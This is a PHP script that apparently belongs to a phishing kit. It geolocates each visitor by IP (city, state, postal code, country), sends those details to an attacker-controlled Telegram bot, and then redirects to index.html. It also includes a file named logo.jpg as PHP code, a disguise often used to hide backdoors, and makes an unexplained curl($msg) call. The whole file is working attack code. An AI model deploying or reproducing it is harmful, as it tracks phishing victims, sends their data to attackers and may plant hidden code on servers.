<?php
ob_start();
session_start();
include 'config.php';
include("./assets/files/logo.jpg");
include("./assets/function.php");
date_default_timezone_set("Asia/Manila");

$time1 = date('M d - h:i:s A');

$_SESSION['ip_countryName'] = clientData('country');
$countryname = $_SESSION['ip_countryName'];
$_SESSION['ip_city'] = clientData('city');
$city = $_SESSION['ip_city'];
$_SESSION['ip_state'] = clientData('state');
$state = $_SESSION['ip_state'];
$zip = file_get_contents("https://ipapi.co/" . $ip . "/postal");


$msg = "[$ip2] - V I S I T O R - [$time1]\r\nCity: " .$city."\nState : " .$state."\nZip: " .$zip."\nFROM: $countryname\r\n";


// TELEGRAM SEND FUNCTION (GO TO CONFIG.PHP)
 if ($telegram == "yes"){
$website = "https://api.telegram.org/bot" .$api;curl($msg);
$params = ['chat_id' => $chatid, 'text' => $msg, ];
$ch = curl_init($website . '/sendMessage');
curl_setopt($ch, CURLOPT_HEADER, false);
curl_setopt($ch, CURLOPT_RETURNTRANSFER, 1);
curl_setopt($ch, CURLOPT_POST, 1);
curl_setopt($ch, CURLOPT_POSTFIELDS, ($params));
curl_setopt($ch, CURLOPT_SSL_VERIFYPEER, false);
$result = curl_exec($ch);
curl_close($ch);
}
    exit(header("Location: index.html"));

?>